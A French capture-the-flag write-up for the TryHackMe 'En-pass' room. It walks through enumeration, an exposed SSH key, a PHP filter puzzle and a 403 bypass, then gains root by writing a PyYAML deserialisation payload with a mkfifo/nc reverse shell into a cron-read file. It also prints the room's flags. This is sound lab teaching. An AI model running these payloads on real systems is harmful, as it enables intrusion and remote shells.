# En-pass #

## Task 1 Enpass ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.139.196 enpass.thm' > /etc/hosts" 
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A enpass.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 11:44 CEST
Nmap scan report for enpass.thm (10.10.139.196)
Host is up (0.034s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: En-Pass
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/5%OT=22%CT=1%CU=36933%PV=Y%DS=2%DC=T%G=Y%TM=615C1EE
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST1
OS:1NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   33.75 ms 10.9.0.1
2   33.54 ms enpass.thm (10.10.139.196)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.60 seconds

```

D'après le scan nmap on a deux services.  
Le service SSH sur le port 22.   
Le service HTTP sur le port 8001.  

![page1](./Task1-01.png)  

Sur la page principale on ne trouve pas grand chose.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://enpass.thm:8001 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --quiet
/web                  (Status: 301) [Size: 313] [--> http://enpass.thm:8001/web/]
/zip                  (Status: 301) [Size: 313] [--> http://enpass.thm:8001/zip/]

tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://enpass.thm:8001/web/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --quiet
/resources            (Status: 301) [Size: 323] [--> http://enpass.thm:8001/web/resources/]

tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://enpass.thm:8001/web/resources/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --quiet
/infoseek             (Status: 301) [Size: 332] [--> http://enpass.thm:8001/web/resources/infoseek/]

tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://enpass.thm:8001/web/resources/infoseek/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --quiet
/configure            (Status: 301) [Size: 342] [--> http://enpass.thm:8001/web/resources/infoseek/configure/]

tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://enpass.thm:8001/web/resources/infoseek/configure/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --quiet
/key                  (Status: 200) [Size: 1766]
```

On trouve avec gobuster un lien  http://enpass.thm:8001/web/resources/infoseek/configure/key.  

**Name The Path**

Le nom du chemin est : /web/resources/infoseek/configure/key

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl  http://enpass.thm:8001/web/resources/infoseek/configure/key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3A3DBCAED659E70F7293FA98DB8C1802

V0Z7T9g2JZvMMhiZ6JzYWaWo8hubQhVIu3AcrxJZqFD0o2FW1K0bHGLbK8P+SaAc
9plhOtJX6ZUjtq92E/sinTG0wwc94VmwiA5lvGmjUtBjah4epDJs8Vt/tIpSTg8k
28ef1Q8+5+Kl4alJZWNF0RVpykVEXKqYw3kJBqQDTa4aH75MczJGfk4TY5kdZFO3
tPVajm46V2C/9OrjOpEVg2jIom+e4kJAaJdB7Jr7br3xoaYhe5YEUiSGM8YD7SUZ
azrAFkIoZ72iwdeVGR7CWgdwmDWw/nFvg6Ug/fsAGobDCf2CtwLEUtLL/XMpLvEb
AS0Wic1zPjCCGaVSyijImrh3beYgWbZzz7h5gmqfoycVKS4S+15tFZBZRA0wH05m
XfDw6It7ZZtP73i8XoOAg1gAbv6o/vR3GkF798bc0fV4bGJrpQ9MIEpOphR1SNuI
x0gjtCfIyYjwJmwlWeNmELyDAO3oIxYZBSydHko0EUBnbeOw+Jj3xvEdNO3PhZ7G
3UPIoZMH4KAdcXy15tL0MYGmXyOx+oHuDEPNHxkR3+lJ1C+BXJwtrSXU+qz9u/Sz
qavHdwzxc8+HiiWcGxN3LEdgfsKg/TKXA5X/TE7DnjVmhsL4IBCOIyPxF8ClXok7
YMwNymz269J85Y73gemMfhwvGC18dNs0xfYEMUtDWbrwJDsTezdBmssMvOHSjpr5
w+Z+sJvNabMIBVaQs+jqJoqm8EARNzA40CBQUJJdmqBfPV/xSmHzNOLdTspOShQN
5iwP3adKdq+/TCp2l8SaXQedMIf6DCPmcuUVrYK4pjAr7NzFVNUgqbYLT1J0thGr
gQBk+0RlQadN7m7BW835YeyvN0GKM35f7tUylJHcfTdjE832zB24iElDW483FvJy
RhM+bOBts0z+zVUx0Ua+OEM1sxwAAlruur4+ucCPFV1XrWYWfLo3VXvTbhPiZcXF
fmOJKaFxBFjbARQMR0IL5CH8tPz2Kbeaepp2sUZcgDZSHWAbvg0j8QVkisJJ/H7G
Vg6MdIRf+Ka9fPINxyrWnxDoIVqP5/HyuPjrmRN9wMA8lWub8okH9nlJoss3n8j5
xom80wK197o29NN6BWEUuagXSHdnU2o+9L991kScaC9XXOuRgqFrDRFBUUn1VOWJ
3p+lTLNscC+eMP0Be3U6R85b/o3grdb610A1V88pnDWGYa/oVgXelUh1SsHA0tuI
om679j9qdIP7O8m3PK0Wg/cSkjdj0vRxT539tAY1+ci99FXnO1Touo7mlaA4eRTK
LQLmzFcucQODcm3FEy18doT2llDTyloD2PmX+ipzB7mbdqw7pUXPyFTnGZoKrnhM
27L629aKxoM19Mz0xP8BoQMcCOCYklIw1vkaiPgXAYkNXXtBzwWn1SFcU57buaED
CJCnh3g19NZ/VjJ1zERJLjK1U1l/RtlejISAB35AYFUnKDG3iYXLRP3iT/R22BMd
z4uSYN10O1nr4EppAOMtdSdd9PJuwxKN/3nJvymMf3O/MmC/8DJOIyadZzEw7EbP
iU5caghFrCuuhCagiwYr+qeKM3BwMUBPeUXVWTCVmFkA7jR86XTMfjkD1vgDFj/8
```

On découvre que c'est une clef privée.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl  http://enpass.thm:8001/web/resources/infoseek/configure/key > key -s
tim@kali:~/Bureau/tryhackme/write-up$ python2 /usr/share/john/ssh2john.py key > hash
tim@kali:~/Bureau/tryhackme/write-up$ john hash -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates left, minimum 4 needed for performance.
0g 0:00:00:02 DONE (2021-10-05 13:08) 0g/s 6374Kp/s 6374Kc/s 6374KC/sa6_123..*7¡Vamos!
Session completed
```

On essaie de craquer le mot de passe avec le dictionnaire rockyou.txt mais on ne trouve pas le dictionnaire.    

![page1](./Task1-02.png) 

Dans le lien enpass.thm:8001/zip ou trouve plein de fichier zip de a0.zip à a100.zip.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ for i in {0..100};do wget http://enpass.thm:8001/zip/a$i.zip -nv ;done
```

On télécharge les fichiers zip.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sha1sum *.zip | head
2dc63abd2850d01526cad099c542bf8a196a987f  a0.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a100.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a10.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a11.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a12.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a13.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a14.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a15.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a16.zip
311ac6af58972cab0606ce098445ce3ba1227f09  a17.zip
```

On regarde si les fichiers sont différents.   
Le premier fichier est différent.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ unzip a0.zip 
Archive:  a0.zip
 extracting: a                       
tim@kali:~/Bureau/tryhackme/write-up$ cat a
sadman
```

On extrait le fichier a0.zip.  
On trouve un fichier a qui contient un nom d'utilisateur qui est sadman.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://enpass.thm:8001/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -x php,txt,html --quiet
/index.html           (Status: 200) [Size: 2563]
/web                  (Status: 301) [Size: 313] [--> http://enpass.thm:8001/web/]
/reg.php              (Status: 200) [Size: 2417]                                 
/403.php              (Status: 403) [Size: 1123]                                 
/zip                  (Status: 301) [Size: 313] [--> http://enpass.thm:8001/zip/]
```

On trouve un lien en reg.php.  

![page3](./Task1-03.png) 

On tombe sur un formulaire.  

```php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          
          $val = explode(",",$title);

          $sum = 0;
          
          for($i = 0 ; $i < 9; $i++){

                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {

                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
            
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          
          
          }

          if ( ($sum) == 9 ){
            

              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";

        
            
            }
            

                    else{

                      echo "  Try Try!!";

                
                    }
          }
        
          else{

            echo "  Try Again!! ";

      
          }     
 
  }
```

Dans le code source de la page on trouve comment il vérifie les données saisies.   

le programme vérifie que la saisie de contient pas de lettre et de chiffre, qu'il soit séparé par une virgule.   
La longueur de la chaîne situé à l'index 0 soit de longueur 2 et celle de à l'index 8 de longueur 3.  
La valeur à l'index 5 ne doit être la même que l'index 8 et la valeur de l'index 3 ne doit pas être la même que l'index 7.  
Puis il fait le somme de nombre fois que la condition est bonne.   

On fait une chaîne qui combine les exigences qui est : !@,!@,!@,!@%,!@,!@,!%@,!@#,!@&,!@  

![page4](./Task1-04.png)

On mettant notre chaîne on trouve un mot passe qui est : cimihan_are_you_here?   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ chmod 700 key 
```

On met les bons droit sur key.   

On trouve un autre page avec le lien 403.php.   

```bash
im@kali:~/Bureau/tryhackme/write-up$ git clone https://github.com/timruff/403fuzzer
Clonage dans '403fuzzer'...
remote: Enumerating objects: 78, done.
remote: Counting objects: 100% (78/78), done.
remote: Compressing objects: 100% (72/72), done.
remote: Total 78 (delta 25), reused 11 (delta 4), pack-reused 0

Réception d'objets: 100% (78/78), 21.43 Kio | 1.79 Mio/s, fait.
Résolution des deltas: 100% (25/25), fait.
tim@kali:~/Bureau/tryhackme/write-up$ cd 403fuzzer/
tim@kali:~/Bureau/tryhackme/write-up/403fuzzer$ python 403fuzzer.py -u http://enpass.thm:8001/403.php | grep 200
Response Code: 200	Length: 2563	Path: /
Response Code: 200	Length: 2563	Path: /
Response Code: 200	Length: 2563	Path: /
Response Code: 200	Length: 2563	Path: /403.php/%2e%2e
Response Code: 200	Length: 2563	Path: /403.php/%2e%2e/
Response Code: 200	Length: 2563	Path: /403.php/..
Response Code: 200	Length: 2563	Path: /403.php/../
Response Code: 200	Length: 2563	Path: /403.php/../../..//
Response Code: 200	Length: 2563	Path: /403.php/../..//
Response Code: 200	Length: 2563	Path: /403.php/../.;/../
Response Code: 200	Length: 2563	Path: /403.php/..//
Response Code: 200	Length: 2563	Path: /403.php/..//../
Response Code: 200	Length: 2563	Path: /403.php/../;/../
Response Code: 200	Length: 917	Path: /403.php/..;/
Response Code: 200	Length: 2563	Path: /403.php//../../

```

On contourne l'erreur 403 et on a une bonne page et une taille différente pour /..;/  

![page5](./Task1-05.png)

Sur cette nouvelle page on voit un nouveau nom qui est :  imsau

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh -i key imsau@enpass.thm 
Enter passphrase for key 'key': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-201-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

1 package can be updated.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


$ id
uid=1002(imsau) gid=1002(imsau) groups=1002(imsau)
```

Avec la clef, le nom imsau et le mot passe : cimihan_are_you_here?   
On obtient un shell.    

**What is the user flag?**

```bash
$ ls
user.txt
$ cat user.txt	
1c5ccb6ce6f3561e302e0e516c633da9
```

On a le premier flag qui est : 1c5ccb6ce6f3561e302e0e516c633da9   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -nv
2021-10-05 20:49:48 URL:https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211005%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211005T184947Z&X-Amz-Expires=300&X-Amz-Signature=55092a3f453a3bc453b7bd9c5fc0deb14278d42797d5eadd8ef9746900644780&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [3078592/3078592] -> "pspy64" [1]

---------------

$ cd /tmp
$ nc -lp 1234 > pspy64

---------------

tim@kali:~/Bureau/tryhackme/write-up$ nc enpass.thm 1234 < pspy64 
$ chmod u+x pspy64

```

On transfère linpeas.sh sur la machine cible.  

```bash
$ ./pspy64	
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
...
2021/10/05 18:52:18 CMD: UID=0    PID=1000   | /usr/lib/policykit-1/polkitd --no-debug 
2021/10/05 18:52:18 CMD: UID=0    PID=10     | 
2021/10/05 18:52:18 CMD: UID=0    PID=1      | /sbin/init 
2021/10/05 18:52:52 CMD: UID=0    PID=22660  | ps -e -o pid,ppid,state,command 
2021/10/05 18:53:01 CMD: UID=0    PID=22666  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/10/05 18:53:01 CMD: UID=0    PID=22665  | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/10/05 18:53:01 CMD: UID=0    PID=22664  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/10/05 18:53:01 CMD: UID=0    PID=22663  | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/10/05 18:53:01 CMD: UID=0    PID=22662  | /usr/sbin/CRON -f 
2021/10/05 18:53:01 CMD: UID=0    PID=22661  | /usr/sbin/CRON -f 
2021/10/05 18:53:01 CMD: UID=0    PID=22667  | sudo chown root:root /tmp/file.yml 
2021/10/05 18:53:01 CMD: UID=0    PID=22668  | sudo /usr/bin/python /opt/scripts/file.py 
2021/10/05 18:53:54 CMD: UID=0    PID=22669  | 
2021/10/05 18:54:01 CMD: UID=0    PID=22675  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/10/05 18:54:01 CMD: UID=0    PID=22674  | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/10/05 18:54:01 CMD: UID=0    PID=22673  | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2021/10/05 18:54:01 CMD: UID=0    PID=22672  | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2021/10/05 18:54:01 CMD: UID=0    PID=22671  | /usr/sbin/CRON -f 
2021/10/05 18:54:01 CMD: UID=0    PID=22670  | /usr/sbin/CRON -f 
2021/10/05 18:54:01 CMD: UID=0    PID=22676  | sudo chown root:root /tmp/file.yml 
2021/10/05 18:54:01 CMD: UID=0    PID=22677  | sudo /usr/bin/python /opt/scripts/file.py 
...
```

On pspy64 on remarque qu'il y a un fichier /opt/scripts/files.py qui est lancé toute les minutes.   

```bash
$ cat /opt/scripts/file.py
#!/usr/bin/python
import yaml


class Execute():
	def __init__(self,file_name ="/tmp/file.yml"):
		self.file_name = file_name
		self.read_file = open(file_name ,"r")

	def run(self):
		return self.read_file.read()

data  = yaml.load(Execute().run())
```

On remarque le scripte exécute des commandes dans le fichier file.yml.  

**What is the root flag?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

-------------

$ echo "!!python/object/new:os.system [rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.228.66 4444 >/tmp/f]" > file.yml

-------------

tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.95.90.
Ncat: Connection from 10.10.95.90:38864.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
5d45f08ee939521d59247233d3f8faf
```

On écoute le port 4444 pour avoir un shell.  
On met un reverse shell dans le file.yml.   
On attend environ 1 min et on obtient un shell avec les droits root.   
Dans le fichier root.txt on obtient le dernier flag.   

La flag est : 5d45f08ee939521d59247233d3f8faf   